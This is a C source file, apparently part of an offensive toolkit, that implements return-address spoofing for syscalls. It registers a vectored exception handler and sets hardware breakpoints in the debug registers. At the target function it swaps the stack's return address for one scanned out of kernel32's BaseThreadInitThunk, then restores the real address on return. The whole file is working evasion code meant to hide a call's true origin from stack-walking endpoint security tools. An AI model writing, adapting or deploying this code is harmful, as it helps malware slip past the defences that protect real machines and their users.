#include "VehSpoof.h"
#include "Common.h"

static PVOID g_hVeh = NULL;
static PVOID g_pTargetFunc = NULL;
static PVOID g_pSpoofRetAddr = NULL;
static DWORD64 g_RealRet = 0;

// Retrieves a legitimate, signed function address for the call stack.
// Scans BaseThreadInitThunk for the first indirect CALL reg (FF D?) instruction
// and returns the address of the byte immediately after it — i.e., the return
// address that the CPU would push when that CALL executes.
// This replaces the hardcoded +0x14 offset which breaks on some Windows builds.
static PVOID GetBenignRetAddress() {
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) return NULL;
    PVOID pFunc = GetProcAddress(hKernel32, "BaseThreadInitThunk");
    if (!pFunc) return NULL;

    // Pattern scan: look for CALL r/m64 with register operand — opcode FF, ModRM 0xD0..0xD7
    // (ModRM = 11 010 rrr — register direct, /2 group)
    // Limit scan to 64 bytes — BaseThreadInitThunk is a small stub on all Windows versions.
    PBYTE p = (PBYTE)pFunc;
    for (int i = 0; i < 62; i++) {
        if (p[i] == 0xFF && (p[i + 1] & 0xF8) == 0xD0) {
            // Found CALL <reg>; return address is the byte immediately after (i + 2)
            return (PVOID)(p + i + 2);
        }
    }

    // Fallback: version-specific offset (Windows 10 20H2 and most 11 builds)
    return (PVOID)(p + 0x14);
}

static LONG NTAPI VehHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
        
        // 1. Interception at the beginning of the Syscall execution (Dr0)
        if (pExceptionInfo->ContextRecord->Rip == (DWORD64)g_pTargetFunc) {
            
            // Save the real return address from the stack
            g_RealRet = *(DWORD64*)(pExceptionInfo->ContextRecord->Rsp);
            
            // Overwrite the return address on the stack with a benign address (Spoofing)
            *(DWORD64*)(pExceptionInfo->ContextRecord->Rsp) = (DWORD64)g_pSpoofRetAddr;
            
            // Set Dr1 to catch the execution when the syscall returns to the spoofed address
            pExceptionInfo->ContextRecord->Dr1 = (DWORD64)g_pSpoofRetAddr;
            pExceptionInfo->ContextRecord->Dr7 |= (1 << 2); // Enable Dr1 locally
            
            pExceptionInfo->ContextRecord->EFlags |= (1 << 16); // Set Resume Flag (RF) to avoid infinite loop
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        
        // 2. Interception when the syscall returns to our benign address (Dr1)
        if (pExceptionInfo->ContextRecord->Rip == (DWORD64)g_pSpoofRetAddr) {
            
            // Restore the instruction pointer to the real return address
            pExceptionInfo->ContextRecord->Rip = g_RealRet;
            
            // Clear Dr1
            pExceptionInfo->ContextRecord->Dr1 = 0;
            pExceptionInfo->ContextRecord->Dr7 &= ~(1 << 2);
            
            pExceptionInfo->ContextRecord->EFlags |= (1 << 16); // Set Resume Flag (RF)
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL VehSpoof_Init(PVOID pTargetFunc) {
    g_pTargetFunc = pTargetFunc;
    g_pSpoofRetAddr = GetBenignRetAddress();
    
    if (!g_pTargetFunc || !g_pSpoofRetAddr) return FALSE;

    // Register VEH
    g_hVeh = AddVectoredExceptionHandler(1, VehHandler);
    if (!g_hVeh) return FALSE;

    // Set HWBP (Dr0) on the target function for the current thread
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();

    if (GetThreadContext(hThread, &ctx)) {
        ctx.Dr0 = (DWORD64)g_pTargetFunc;
        ctx.Dr7 |= 1; // Enable Dr0 locally
        SetThreadContext(hThread, &ctx);
        return TRUE;
    }
    
    return FALSE;
}

void VehSpoof_Cleanup(void) {
    if (g_hVeh) {
        RemoveVectoredExceptionHandler(g_hVeh);
        g_hVeh = NULL;
    }
    
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();

    if (GetThreadContext(hThread, &ctx)) {
        ctx.Dr0 = 0;
        ctx.Dr1 = 0;
        ctx.Dr7 &= ~(1 | (1 << 2)); 
        SetThreadContext(hThread, &ctx);
    }
}
